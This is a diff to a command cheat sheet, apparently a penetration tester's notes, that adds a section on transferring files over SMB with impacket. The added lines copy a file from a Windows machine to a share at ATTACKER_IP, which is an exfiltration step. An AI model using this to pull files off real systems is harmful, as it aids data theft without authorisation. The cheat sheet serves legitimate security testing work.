@@ -46,6 +46,12 @@ Download/Send files from/to through SSH
 scp user@userip:/from_dir/file /to_dir || download from another user
 scp file.txt remote_username@10.10.0.2:/remote/directory || send file file.txt
 ```
+Download/Send files through SMB using Python impacket
+```
+python3.9 /opt/smbserver.py -smb2support -username <username> -password <password> public share || make a "share" folder first
+copy C:\Path\To\file.txt \\ATTACKER_IP\public\
+
+```
 Grep
 ```
 grep "[word]" [file] || search a line in a file with the [word] in it
